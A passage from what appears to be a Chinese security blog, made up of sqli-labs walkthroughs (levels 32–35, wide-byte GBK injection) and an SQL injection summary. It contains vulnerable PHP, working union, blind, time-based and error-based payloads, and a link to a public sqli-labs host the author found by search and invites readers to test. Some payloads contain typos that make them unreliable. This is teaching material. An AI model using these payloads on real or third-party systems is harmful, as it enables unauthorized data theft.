/&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpfunction strToHex($string){    $hex=&#39;&#39;;    for ($i=0; $i &lt; strlen($string); $i++)    {        $hex .= dechex(ord($string[$i]));    }    return $hex;}echo &quot;Hint: The Query String you input is escaped as : &quot;.$id .&quot;&lt;br&gt;&quot;;echo &quot;The Query String you input in Hex becomes : &quot;.strToHex($id). &quot;&lt;br&gt;&quot;;?&gt;&lt;/center&gt;&lt;/font&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>原本是没有漏洞的，但是由于数据库编码设置为gbk，导致形成了宽字节注入</p><pre><code>%df’ 由于&#39;的出现会有反斜杆冒出来，但是因为数据库编码为GBK，%df加上反斜杆，导致成为一个繁体字連，使得&#39;成功逃逸</code></pre><p><img src="https://s2.ax1x.com/2019/01/31/k1oX1s.md.png" alt="k1oX1s.md.png"></p><p>最终payload</p><pre><code>http://127.0.0.1/sqli-labs-master/Less-32/?id=0%df%27%20union%20select%201,user(),3%20%23</code></pre><p><img src="https://s2.ax1x.com/2019/01/31/k1Tp7T.md.png" alt="k1Tp7T.md.png"><br>使用URL编码%23来代替#</p><p><b>第三十三关</b><br>三十三关的代码没变化：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-32 **Bypass addslashes()**&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;5&quot; color=&quot;#00FF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);function check_addslashes($string){    $string= addslashes($string);        return $string;}// take the variables if(isset($_GET[&#39;id&#39;])){$id=check_addslashes($_GET[&#39;id&#39;]); /*添加反斜杆*///echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity mysql_query(&quot;SET NAMES gbk&quot;);$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    {      echo &#39;&lt;font color= &quot;#00FF00&quot;&gt;&#39;;          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];      echo &quot;&lt;br&gt;&quot;;      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];      echo &quot;&lt;/font&gt;&quot;;      }    else     {    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-33.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpfunction strToHex($string){    $hex=&#39;&#39;;    for ($i=0; $i &lt; strlen($string); $i++)    {        $hex .= dechex(ord($string[$i]));    }    return $hex;}echo &quot;Hint: The Query String you input is escaped as : &quot;.$id .&quot;&lt;br&gt;&quot;;echo &quot;The Query String you input in Hex becomes : &quot;.strToHex($id);?&gt;&lt;/center&gt;&lt;/font&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>闭合方式没变，数据库也还是GBK编码。注入语句常规操作</p><pre><code>http://127.0.0.1/sqli-labs-master/Less-33/?id=1%df%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)%20%23</code></pre><p><b>第三十四关</b></p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;    &lt;title&gt;Less-34- Bypass Add SLASHES&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:24px; text-align:center&quot;&gt; Welcome&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&lt;div  align=&quot;center&quot; style=&quot;margin:40px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;&quot;&gt;&lt;div style=&quot;padding-top:10px; font-size:15px;&quot;&gt;&lt;!--Form to post the data for sql injections Error based SQL Injection--&gt;&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;    &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;        &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;    &lt;/div&gt;      &lt;div&gt; Password  : &amp;nbsp;&amp;nbsp;&amp;nbsp;        &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;    &lt;/div&gt;&lt;/br&gt;    &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;    &lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/Less-34.jpg&quot; /&gt;&lt;/center&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);// take the variablesif(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;])){    $uname1=$_POST[&#39;uname&#39;];    $passwd1=$_POST[&#39;passwd&#39;];        //echo &quot;username before addslashes is :&quot;.$uname1 .&quot;&lt;br&gt;&quot;;        //echo &quot;Input password before addslashes is : &quot;.$passwd1. &quot;&lt;br&gt;&quot;;    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;User Name:&#39;.$uname1);    fwrite($fp,&#39;Password:&#39;.$passwd1.&quot;\n&quot;);    fclose($fp);        $uname = addslashes($uname1);        $passwd= addslashes($passwd1);        //echo &quot;username after addslashes is :&quot;.$uname .&quot;&lt;br&gt;&quot;;        //echo &quot;Input password after addslashes is : &quot;.$passwd;        // connectivity     mysql_query(&quot;SET NAMES gbk&quot;);    @$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;    $result=mysql_query($sql);    $row = mysql_fetch_array($result);    if($row)    {          //echo &#39;&lt;font color= &quot;#0000ff&quot;&gt;&#39;;              echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#39;;        //echo &quot; You Have successfully logged in\n\n &quot; ;        echo &#39;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#39;;            echo &quot;&lt;br&gt;&quot;;        echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];        echo &quot;&lt;br&gt;&quot;;        echo &#39;Your Password:&#39; .$row[&#39;password&#39;];        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;/font&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#39;;              echo &quot;&lt;/font&gt;&quot;;      }    else      {        echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;;        //echo &quot;Try again looser&quot;;        print_r(mysql_error());        echo &quot;&lt;/br&gt;&quot;;        echo &quot;&lt;/br&gt;&quot;;        echo &quot;&lt;/br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;;            echo &quot;&lt;/font&gt;&quot;;      }}?&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpecho &quot;Hint: The Username you input is escaped as : &quot;.$uname .&quot;&lt;br&gt;&quot;;echo &quot;Hint: The Password you input is escaped as : &quot;.$passwd .&quot;&lt;br&gt;&quot;;?&gt;&lt;/font&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>也是GBK编码，还是宽字节注入，只不过请求方式变为了POST。准确的说应该是，POST宽字节注入<br>payload：</p><pre><code>POST /sqli-labs-master/Less-34/ HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/sqli-labs-master/Less-34/DNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 99uname=admin%df&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) %23&amp;passwd=admin&amp;submit=Submit</code></pre><p>反回结果：<br><img src="https://s2.ax1x.com/2019/01/31/k3P5Tg.png" alt="k3P5Tg.png"></p><p><b>第三十五关</b><br>先看代码：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-35 **why care for addslashes()**&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;5&quot; color=&quot;#00FF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);function check_addslashes($string){    $string = addslashes($string);    return $string;}// take the variables if(isset($_GET[&#39;id&#39;])){$id=check_addslashes($_GET[&#39;id&#39;]);//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity mysql_query(&quot;SET NAMES gbk&quot;);$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    {      echo &#39;&lt;font color= &quot;#00FF00&quot;&gt;&#39;;          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];      echo &quot;&lt;br&gt;&quot;;      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];      echo &quot;&lt;/font&gt;&quot;;      }    else     {    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-35.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpecho &quot;Hint: The Query String you input is escaped as : &quot;.$id;?&gt;&lt;/center&gt;&lt;/font&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>还是gbk编码，还是宽字节注入，，，</p><pre><code>payload:http://127.0.0.1/sqli-labs-master/Less-35/?id=1%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)</code></pre><p><img src="https://s2.ax1x.com/2019/01/31/k3id9s.md.png" alt="k3id9s.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Sql injection summary</title>
      <link href="/posts/7ef54108.html"/>
      <url>/posts/7ef54108.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做了个SQL注入的总结，撸了那么多关。以及学了那么久，是时候做个全面的总结了，当然sqli-labs还没撸床。不会善罢甘休的。<br><img src="http://d.5857.com/jinmu_150521/desk_009.jpg" alt="desk_009.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h4 id="漏洞由来"><a href="#漏洞由来" class="headerlink" title="漏洞由来"></a>漏洞由来</h4><p>后端处理程序查询数据库或写入数据库时没有做好对应的过滤措施<br>导致被查询的语句带有注入语句，引发的SQL注入</p><h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><p>危险等级：高<br>说明：攻击者可从注入点获取敏感数据，若是数据库用户权限高还能getshell，甚至提权</p><h4 id="常见的数据库"><a href="#常见的数据库" class="headerlink" title="常见的数据库"></a>常见的数据库</h4><p>1.MYSQL<br>2.MSSQL<br>3.POSTSQL<br>4.NOSQL</p><h4 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h4><p>1.普通类型注入<br>2.盲注<br>3.延时注入<br>4.报错注入<br>5.堆叠注入<br>6.POST注入<br>7.宽字节注入<br>8.cookie注入<br>9.Referer注入<br>10.headers注入<br>11.闭合注入<br>12.base64注入</p><h4 id="注入的过程"><a href="#注入的过程" class="headerlink" title="注入的过程"></a>注入的过程</h4><p>普通注入的过程：<br>1.判断是否存在注入<br>2.跑位置<br>3.通过位置获取数据库名或用户名，数据库版本号等<br>4.查询表名<br>5.查询字段名<br>6.获取数据</p><p>盲注的过程：<br>1.判断是否有注入<br>2.跑数据库长度<br>3.猜解数据库名称<br>4.猜解表的个数<br>5.猜解表的长度<br>6.猜解表名<br>7.猜解字段个数<br>8.猜解字段长度<br>9.猜解字段名<br>10.猜解数据个数<br>11.猜解数据长度<br>12.猜解数据</p><h4 id="注入的适用"><a href="#注入的适用" class="headerlink" title="注入的适用"></a>注入的适用</h4><p>普通注入适合用于可以正确回显并且可以正常获取出数据<br>盲注适合用于可以正确回显获取不了数据<br>延时注入适用于无法正确回显<br>报错注入适用于可以输出数据库报错<br>POST注入一般出现在用于表单提交到后端带入数据库查询<br>宽字节注入由于页面编码为GBK编码导致注入时可以绕过过滤</p><h4 id="判断是否有注入"><a href="#判断是否有注入" class="headerlink" title="判断是否有注入"></a>判断是否有注入</h4><p>and 1=1 页面返回正常<br>and 1=2 页面返回错误</p><h4 id="常见的查询语句"><a href="#常见的查询语句" class="headerlink" title="常见的查询语句"></a>常见的查询语句</h4><p>这里我上fofas.so找了一个sqli-labs平台，大家可以自行测试<br><a href="http://35.201.152.114:8000/" target="_blank" rel="noopener">SQL Injections</a></p><p>普通注入语句：</p><pre><code class="sql">and 1=1 页面返回正常and 1=2 页面返回错误order by x 跑位置，直到报错的前一个and 1=2 union select 1,2,3 获取位置，这里的1,2,3是上一步跑出来的and 1=2 union select 1,database(),3 获取数据库名称and 1=2 union select 1,user(),3 获取数据库用户名称and 1=2 union select 1,version(),3 获取数据库版本and 1=2 union select 1,group_count(table_name),3 from information_schmea.tables where table_schema=0x7365637572697479 获取表名，这里0x7365637572697479是数据库表名的hex编码,group count获取全部的意思and 1=2 union select 1,group_count(column_name),3 from information_schema.columns where table_name=0x7573657273 获取字段名称and 1=2 union select 1,username,3 from users 获取数据</code></pre><p>盲注语句：</p><pre><code class="sql">and(length(database())=8) 猜解数据库长度，页面错误的前一个即是长度and(left(database(),8)=&quot;security&quot;) 猜解数据库名称and(1=(select count(table_name) from information_schema.tables where table_schema=&quot;security&quot;)) 猜解表的个数，直到页面正确为止and ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1)) 猜解表名的长度，直到页面返回错误的前一个and ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))=105 猜解表名，105是ascii码and(1=(select count(column_name) from information_schmea.columns where table_name=&quot;users&quot;)) 猜解字段的个数and ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1)) 猜解字段长度and ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1))=98 猜解字段名称and(1=(select count(username) from users)) 猜解数据个数and ascii(substr((select username from users limit 0,1),1,1)) 猜解数据长度and ascii(substr((select username from users limit 0,1),1,1))=150 猜解数据</code></pre><p>延时注入语句</p><pre><code class="sql">and sleep(if((length(database())=8),1,4)) 猜解数据库长度，若是长度正确浏览器请求1秒and sleep(if((left(database(),8)=&quot;security&quot;),1,4))猜解数据库名称and sleep(if((1=(select count(table_name) from information_schema.tables where table_schema=&quot;security&quot;)),1,4)) 猜解表的个数and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))),1,4)) 猜解表的长度and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))=105),1,4)) 猜解表名and sleep(if((1=(select count(column_name) from information_schmea.columns where table_name=&quot;users&quot;)),1,4)) 猜解字段个数and sleep(if((ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1))),1,4)) 猜解字段长度and sleep(if((ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1))=98),1,4)) 猜解字段名and sleep(if((1=(select count(username) from users)),1,4)) 猜解数据长度and sleep(if((ascii(substr((select username from users limit 0,1),1,1))),1,4)) 猜解数个数and sleep(if((ascii(substr((select username from users limit 0,1),1,1))=150),1,4)) 猜解数据</code></pre><p>堆叠注入语句</p><pre><code>公式：;select if((盲注语句),sleep(1),sleep(4))</code></pre><p>报错注入语句</p><pre><code>and updatexml(1,concat(0x7e,(select user()),0x7e),1) select user()改为自己的注入语句</code></pre><p>POST注入就是请求的方式不同</p><p>宽字节注入<br>说明：由于数据库编码为GBK利用GBK编码构造特殊字符绕过过滤<br>过滤代码：</p><pre><code class="php">&lt;?php$conn=mysql_connect(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;root&#39;) or die(&#39;bad!&#39;);mysql_select_db(&#39;security&#39;,$conn);mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;,$conn);$id=addslashes($_GET[&#39;id&#39;]);$sql=&quot;SELECT * FROM users WHEN id=&#39;$id&#39; LIMIT 0,1&quot;;echo $sql.&quot;&lt;br&gt;&quot;;$result=mysql_query($sql,$conn) or die(mysql_error());$row=mysql_fetch_array($result);if($row){    echo $row[&#39;username&#39;].&quot;:&quot;.$row[&#39;address&#39;];}else{    print_r(mysql_error());}?&gt;</code></pre><p>&lt;?php<br>$conn=mysql_connect(‘127.0.0.1’,’root’,’root’) or die(‘bad!’);<br>mysql_select_db(‘security’,$conn);<br>mysql_query(“SET NAMES ‘gbk’”,$conn);<br>$id=addslashes($_GET[‘id’]);<br>$sql=”SELECT * FROM users WHEN id=’$id’ LIMIT 0,1”;<br>echo $sql.”<br>“;<br>$result=mysql_query($sql,$conn) or die(mysql_error());<br>$row=mysql_fetch_array($result);<br>if($row){<br>    echo $row[‘username’].”:”.$row[‘address’];<br>}else{<br>    print_r(mysql_error());<br>}</p><p>?&gt;</p><pre><code>%df &#39;%df and 1=1%df and 1=2</code></pre><p>结果如下：<br><img src="https://s2.ax1x.com/2019/01/31/k1UQMt.png" alt="k1UQMt.png"></p><p>cookie注入<br>将网获取到的cookie写入数据库，但是没做好过滤措施导致注入</p><pre><code>这里的注入拿sqli-labs第20关来说明：以下是sqli-labs/Less/20关的代码：&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-20 Cookie Injection- Error Based- string&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;?php//including the Mysql connect parameters.    include(&quot;../sql-connections/sql-connect.php&quot;); /*包含该php文件*/    error_reporting(0);if(!isset($_COOKIE[&#39;uname&#39;])) /*如果变量不存在则执行*/    {    //including the Mysql connect parameters.    include(&quot;../sql-connections/sql-connect.php&quot;);    echo &quot;&lt;div style=&#39; margin-top:20px;color:#FFF; font-size:24px; text-align:center&#39;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&#39;#FF0000&#39;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&quot;;    echo &quot;&lt;div  align=&#39;center&#39; style=&#39;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&#39;&gt;&quot;;    echo &quot;&lt;div style=&#39;padding-top:10px; font-size:15px;&#39;&gt;&quot;;    echo &quot;&lt;!--Form to post the contents --&gt;&quot;;    echo &#39;&lt;form action=&quot; &quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;&#39;;    echo &#39; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;&#39;;    echo &#39;   &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;&#39;;    echo &#39; &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;&#39;;    echo &#39;   &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;&#39;;        echo &#39;   &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&#39;;    echo &#39;&lt;/form&gt;&#39;;    echo &#39;&lt;/div&gt;&#39;;    echo &#39;&lt;/div&gt;&#39;;    echo &#39;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&#39;;    echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;    echo &#39;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;;    echo &#39;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#39;;    echo &#39;&lt;/center&gt;&#39;;function check_input($value)    {    if(!empty($value)) /*如果变量不为空*/        {        $value = substr($value,0,20); // truncation (see comments) /*从0的位置开始读取，长度为20*/        }        if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled /*开启magic_quotes*/            {            $value = stripslashes($value); /*反引用一个引用字符串*/            }        if (!ctype_digit($value))       // Quote if not a number /*纯数字检查*/            {            $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;            }    else        {        $value = intval($value); /*取整数*/        }    return $value;    }    echo &quot;&lt;br&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;    if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;])) /*判断uname和passwd是否存在*/        {        $uname = check_input($_POST[&#39;uname&#39;]); /*调用check_input过滤变量*/        $passwd = check_input($_POST[&#39;passwd&#39;]);        $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;        $result1 = mysql_query($sql); /*查询数据库*/        $row1 = mysql_fetch_array($result1);        $cookee = $row1[&#39;username&#39;];            if($row1)                {                echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#39;;                setcookie(&#39;uname&#39;, $cookee, time()+3600);                    header (&#39;Location: index.php&#39;);                echo &quot;I LOVE YOU COOKIES&quot;;                echo &quot;&lt;/font&gt;&quot;;                echo &#39;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#39;;                            //echo &#39;Your Cookie is: &#39; .$cookee;                echo &quot;&lt;/font&gt;&quot;;                echo &quot;&lt;br&gt;&quot;;                print_r(mysql_error());                            echo &quot;&lt;br&gt;&lt;br&gt;&quot;;                echo &#39;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#39;;                echo &quot;&lt;br&gt;&quot;;                }            else                {                echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;;                //echo &quot;Try again looser&quot;;                print_r(mysql_error());                echo &quot;&lt;/br&gt;&quot;;                            echo &quot;&lt;/br&gt;&quot;;                echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;;                    echo &quot;&lt;/font&gt;&quot;;                  }            }            echo &quot;&lt;/font&gt;&quot;;      echo &#39;&lt;/font&gt;&#39;;    echo &#39;&lt;/div&gt;&#39;;}else{    if(!isset($_POST[&#39;submit&#39;])) /*如果submit不存在*/        {            $cookee = $_COOKIE[&#39;uname&#39;];            $format = &#39;D d M Y - H:i:s&#39;;            $timestamp = time() + 3600;            echo &quot;&lt;center&gt;&quot;;            echo &#39;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;;            echo &#39;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#39;;            echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;            echo &#39;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#39;;                echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&#39;HTTP_USER_AGENT&#39;];            echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;                echo &#39;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#39;;                echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&#39;REMOTE_ADDR&#39;];                        echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;                        echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#39;;            echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;;            echo &#39;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#39;;                        echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp);            echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;            $sql=&quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; LIMIT 0,1&quot;;            $result=mysql_query($sql);            if (!$result)                  {                  die(&#39;Issue with your mysql: &#39; . mysql_error());                  }            $row = mysql_fetch_array($result);            if($row)                {                  echo &#39;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#39;;                      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];                  echo &quot;&lt;br&gt;&quot;;                echo &#39;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#39;;                      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];                  echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;;                echo &quot;&lt;br&gt;&quot;;                echo &#39;Your ID:&#39; .$row[&#39;id&#39;];                  }            else                    {                echo &quot;&lt;center&gt;&quot;;                echo &#39;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;;                echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;                echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;                //echo &#39;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#39;;                }            echo &#39;&lt;center&gt;&#39;;            echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;;            echo &#39;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#39;;            echo &#39;&lt;/form&gt;&#39;;            echo &#39;&lt;/center&gt;&#39;;        }        else        {        echo &#39;&lt;center&gt;&#39;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#39;;        echo &quot; Your 